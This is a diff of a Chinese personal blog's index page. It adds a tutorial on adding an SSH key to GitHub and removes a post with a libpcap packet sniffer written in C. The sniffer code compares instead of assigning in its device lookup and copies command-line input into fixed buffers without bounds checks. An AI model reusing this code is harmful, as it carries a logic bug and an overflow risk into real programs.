+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PCB博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2016/04/16/github-ssh/" itemprop="url">github添加ssh秘钥</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-04-16T18:00:22+08:00">
+                2016-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在windows下git push时由于每次都要提示输入用户名，密码，确实很繁杂，我们可以在windows下生成ssh秘钥，并将公钥放到github上，这样每次git push时就会自动匹配github上的公钥和自己机器上的密钥，从而避免自己输入用户名，密码。</p>
+<ul>
+<li>首先下载git客户端，<a href="https://git-scm.com/downloads" target="_blank" rel="external">这里</a>提供一个下载地址。</li>
+<li>将git客户端安装之后，右键打开git bash</li>
+<li>在git bash中输入ssh-keygen，然后就会提示生成文件的路径，在此默认路径即可，然后提示输入密码，在此可以不输入密码，也可以输入，如果输入的时候，先记住，在后面的步骤会用到。</li>
+<li>在生成ssh公钥密钥的文件夹中找到一个.pub后缀名的文件，用记事本打开，将其全部内容粘贴。</li>
+<li>打开github客户端,在右上角自己头像处点击，找到setting，然后找到SSH and GPG keys,点解new SSH keys,将粘贴的.pub文件的内容添加进去，保存即可。</li>
+<li>在自己客户端确认。在git bash中输入ssh -T git@github.com,输入yes，然后输入上步自己填的密码，回车，即可。最后结果如图所示：</li>
+</ul>
+<p><img src="http://i.imgur.com/L2fGBS7.png" alt=""></p>
 
           
         
@@ -1122,147 +2147,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://bin2415.github.io/2016/03/16/Sniffer/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="binpang">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="PCB博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/03/16/Sniffer/" itemprop="url">libpcap编程:Sniffer</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-03-16T17:06:25+08:00">
-                2016-03-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/网络/" itemprop="url" rel="index">
-                    <span itemprop="name">网络</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>主要实现运用libpcap(winpcap)的api进行数据链路层的抓包操作，并一层层进行解析，解析TCP, UDP, ICMP等协议。</p>
-<h3 id="主要代码及解析如下"><a href="#主要代码及解析如下" class="headerlink" title="主要代码及解析如下"></a>主要代码及解析如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div></pre></td><td class="code"><pre><div class="line">/*************************************************************************</div><div class="line">	&gt; File Name: sniffer.c</div><div class="line">	&gt; Author: PCB</div><div class="line">	&gt; Mail: pangbin2415@gmai.com</div><div class="line">	&gt; Created Time: 2016年04月10日 星期日 20时40分52秒</div><div class="line"> ************************************************************************/</div><div class="line"></div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;pcap.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;unistd.h&gt;</div><div class="line">#include&lt;signal.h&gt;</div><div class="line">#include&lt;sys/socket.h&gt;</div><div class="line">#include&lt;netinet/in.h&gt;</div><div class="line">#include&lt;arpa/inet.h&gt;</div><div class="line">#include&lt;netinet/ip.h&gt;</div><div class="line">#include&lt;netinet/tcp.h&gt;</div><div class="line">#include&lt;netinet/udp.h&gt;</div><div class="line">#include&lt;netinet/ip_icmp.h&gt;</div><div class="line"></div><div class="line">pcap_t* pd;</div><div class="line">int linkhdrlen; //链路层的长度</div><div class="line"></div><div class="line">/*</div><div class="line"> * device: 要连接的设备名字</div><div class="line"> * bpfstr: 要过滤的规则</div><div class="line"> * */</div><div class="line">pcap_t* open_pcap_socket(char* device, const char* bpfstr)</div><div class="line">&#123;</div><div class="line">char errbuf[PCAP_ERRBUF_SIZE];   //存放出错信息</div><div class="line">pcap_t* pd;</div><div class="line">uint32_t srcip, netmask; //存放源的ip地址和子网掩码</div><div class="line">struct bpf_program bpf; //存取bpf过滤规则的一个结构</div><div class="line"></div><div class="line">//找到一个设备</div><div class="line">if(!*device &amp;&amp; !(device == pcap_lookupdev(errbuf)))</div><div class="line">&#123;</div><div class="line">printf(&quot;pcap_lookupdev(): %s\n&quot;, errbuf);</div><div class="line">return NULL;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//打开该设备，并且等到一个包到来</div><div class="line">if((pd = pcap_open_live(device, BUFSIZ, 1, 0, errbuf)) == NULL)</div><div class="line">&#123;</div><div class="line">printf(&quot;pcap_open_live(): %s\n&quot;, errbuf);</div><div class="line">return NULL;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//得到设备的ip地址和ip的掩码</div><div class="line">if(pcap_lookupnet(device, &amp;srcip, &amp;netmask, errbuf) &lt; 0)</div><div class="line">&#123;</div><div class="line">printf(&quot;pcap_lookupnet: %s\n&quot;, errbuf);</div><div class="line">  return NULL;</div><div class="line">&#125;</div><div class="line">//应用过滤规则</div><div class="line">if(pcap_compile(pd, &amp;bpf, (char*)bpfstr, 0, netmask))</div><div class="line">&#123;</div><div class="line">printf(&quot;pcap_compile(): %s\n&quot;, pcap_geterr(pd));</div><div class="line">return NULL;</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(pcap_setfilter(pd, &amp;bpf)&lt;0)</div><div class="line">&#123;</div><div class="line">printf(&quot;pcap_setfilter(): %s\n&quot;, pcap_geterr(pd));</div><div class="line">return NULL;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//printf(&quot;Open_pcapSocket()\n&quot;);</div><div class="line"></div><div class="line">return pd;</div><div class="line">&#125;//end open_pcap_socket(char* device, const char* bpfstr);</div><div class="line"></div><div class="line">void capture_loop(pcap_t* pd, int packets, pcap_handler func)</div><div class="line">&#123;</div><div class="line">int linktype;</div><div class="line"></div><div class="line">//判断数据链路层的类型</div><div class="line">if((linktype = pcap_datalink(pd)) &lt; 0)</div><div class="line">&#123;</div><div class="line">printf(&quot;pcap_datalink(): %s\n&quot;, pcap_geterr(pd));</div><div class="line">return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">switch(linktype)</div><div class="line">&#123;</div><div class="line">case DLT_NULL://BSD回路封装;链路层协议是一个4字节的域</div><div class="line">linkhdrlen = 4;</div><div class="line">break;</div><div class="line"></div><div class="line">case DLT_EN10MB: //以太网，链路层协议是一个14字节的域</div><div class="line">linkhdrlen = 14;</div><div class="line">break;</div><div class="line"></div><div class="line">case DLT_SLIP: </div><div class="line">case DLT_PPP:</div><div class="line">linkhdrlen = 24;  //链路层长度为24个字节</div><div class="line">break;</div><div class="line"></div><div class="line">default:</div><div class="line">printf(&quot;Unsupport datalink (%d)\n&quot;, linktype);</div><div class="line">return;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">//开始抓包</div><div class="line">if(pcap_loop(pd, packets, func, 0) &lt; 0)</div><div class="line">printf(&quot;pcap_loop failed: %s\n&quot;, pcap_geterr(pd));</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*</div><div class="line"> * 解析包的程序*/</div><div class="line">void parse_packet(u_char *user, struct pcap_pkthdr* packethdr, u_char* packetptr)</div><div class="line">&#123;</div><div class="line">struct ip* iphdr;  //netinet库的ip结构</div><div class="line">struct icmphdr* icmphdr;  //icmp结构</div><div class="line">struct tcphdr* tcphdr;//tcp结构</div><div class="line">struct udphdr* udphdr;//udp结构</div><div class="line">char iphdrInfo[256], srcip[256], dstip[256];</div><div class="line">unsigned short id, seq;</div><div class="line">packetptr += linkhdrlen; //过滤掉数据链路层的数据</div><div class="line">iphdr = (struct ip*)packetptr;</div><div class="line">strcpy(srcip, inet_ntoa(iphdr-&gt;ip_src));</div><div class="line">strcpy(dstip, inet_ntoa(iphdr-&gt;ip_dst));</div><div class="line"></div><div class="line">sprintf(iphdrInfo, &quot;ID:%d TOS:0x%x, TTL:%d, Iplen:%d Dglen:%d&quot;,</div><div class="line">   ntohs(iphdr-&gt;ip_id), iphdr-&gt;ip_tos, iphdr-&gt;ip_ttl, 4*iphdr-&gt;ip_hl, ntohs(iphdr-&gt;ip_len)</div><div class="line">   );</div><div class="line"></div><div class="line">//将ip的字段跳过去</div><div class="line">packetptr += 4*iphdr-&gt;ip_hl;</div><div class="line">switch(iphdr-&gt;ip_p)</div><div class="line">&#123;</div><div class="line">case IPPROTO_TCP:  //如果是TCP协议</div><div class="line">tcphdr = (struct tcphdr*)packetptr;</div><div class="line">printf(&quot;TCP %s:%d -&gt; %s:%d\n&quot;, srcip, ntohs(tcphdr-&gt;source), dstip, ntohs(tcphdr-&gt;dest));</div><div class="line">printf(&quot;%s\n&quot;, iphdrInfo);</div><div class="line">printf(&quot;%c%c%c%c%c%c Seq: 0x%x Ack: 0x%x Win: 0x%x TcpLen: %d\n&quot;, (tcphdr-&gt;urg ? &apos;U&apos; : &apos;*&apos;),</div><div class="line">   (tcphdr-&gt;ack ? &apos;A&apos; : &apos;*&apos;),</div><div class="line">   (tcphdr-&gt;psh ? &apos;P&apos; : &apos;*&apos;),</div><div class="line">   (tcphdr-&gt;rst ? &apos;R&apos; : &apos;*&apos;),</div><div class="line">   (tcphdr-&gt;syn ? &apos;S&apos; : &apos;*&apos;),</div><div class="line">   (tcphdr-&gt;fin ? &apos;F&apos; : &apos;*&apos;),</div><div class="line">   ntohl(tcphdr-&gt;seq), ntohl(tcphdr-&gt;ack_seq), ntohs(tcphdr-&gt;window), 4*tcphdr-&gt;doff</div><div class="line">  );</div><div class="line">break;</div><div class="line"></div><div class="line">case IPPROTO_UDP: //UDP协议</div><div class="line">udphdr = (struct udphdr*) packetptr;</div><div class="line">printf(&quot;UDP %s:%d -&gt; %s:%d\n&quot;, srcip, ntohs(udphdr-&gt;source),</div><div class="line">  dstip, ntohs(udphdr-&gt;dest)</div><div class="line">  );</div><div class="line">printf(&quot;%s\n&quot;, iphdrInfo);</div><div class="line">break;</div><div class="line"></div><div class="line">case IPPROTO_ICMP: //ICMP协议</div><div class="line">icmphdr = (struct icmphdr*)packetptr;</div><div class="line">printf(&quot;ICMP %s -&gt; %s\n&quot;, srcip, dstip);</div><div class="line">printf(&quot;%s\n&quot;, iphdrInfo);</div><div class="line">memcpy(&amp;id, (u_char*)icmphdr+4, 2);</div><div class="line">memcpy(&amp;seq, (u_char*)icmphdr+6, 2);</div><div class="line">printf(&quot;Type:%d Code:%d ID:%d Seq:%d\n&quot;, icmphdr-&gt;type, icmphdr-&gt;code, ntohs(id), ntohs(seq));</div><div class="line">break;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div><div class="line">printf(&quot;---------------------------------------------\n\n&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void quiteOut(int signo)</div><div class="line">&#123;</div><div class="line">struct pcap_stat stats;</div><div class="line">if(pcap_stats(pd, &amp;stats) &gt;= 0)</div><div class="line">&#123;</div><div class="line">printf(&quot;%d packets received\n&quot;, stats.ps_recv);</div><div class="line">printf(&quot;%d packtes dropped\n\n&quot;, stats.ps_drop);</div><div class="line">&#125;</div><div class="line">pcap_close(pd);</div><div class="line">exit(0);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">int main(int argc, char **argv)</div><div class="line">&#123;</div><div class="line">char interface[256] = &quot;&quot;, bpfstr[256] = &quot;&quot;;</div><div class="line"></div><div class="line">int packets = 0, c,i;</div><div class="line"></div><div class="line">while((c = getopt(argc, argv, &quot;i:n:&quot;) ) != -1)  //读取参数，当为-i时，指定接口，当为-n时，指定读取多少packets</div><div class="line">&#123;</div><div class="line">switch(c)</div><div class="line">&#123;</div><div class="line">case &apos;i&apos;:</div><div class="line">strcpy(interface, optarg);</div><div class="line">break;</div><div class="line">case &apos;n&apos;:</div><div class="line">packets = atoi(optarg);</div><div class="line">break;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">   </div><div class="line">//获取过滤的字符串</div><div class="line">for(i = optind; i &lt; argc; i++)</div><div class="line">&#123;</div><div class="line">strcat(bpfstr, argv[i]);</div><div class="line">strcat(bpfstr, &quot; &quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//连接接口</div><div class="line">if((pd = open_pcap_socket(interface, bpfstr)))</div><div class="line">&#123;</div><div class="line">/*/</div><div class="line"> * 绑定中断事件给quiteOut函数*/</div><div class="line"></div><div class="line">signal(SIGINT, quiteOut);</div><div class="line">signal(SIGTERM, quiteOut);</div><div class="line">signal(SIGQUIT, quiteOut);</div><div class="line"></div><div class="line">capture_loop(pd, packets, (pcap_handler)parse_packet);</div><div class="line">quiteOut(0);</div><div class="line">&#125;</div><div class="line">exit(0);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h3 id="主要使用"><a href="#主要使用" class="headerlink" title="主要使用"></a>主要使用</h3><p>该程序支持监听的接口及一共要接收的数据包的大小，并且提供过滤功能，具体使用如下：</p>
-<pre><code>sudo ./sniffer -i eth0 tcp port 80
-</code></pre><h3 id="运行结果如下"><a href="#运行结果如下" class="headerlink" title="运行结果如下"></a>运行结果如下</h3><p><img src="http://i.imgur.com/aZcYTH2.png" alt=""></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1305,7 +2196,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-count">11</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1316,7 +2207,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">4</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1327,7 +2218,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
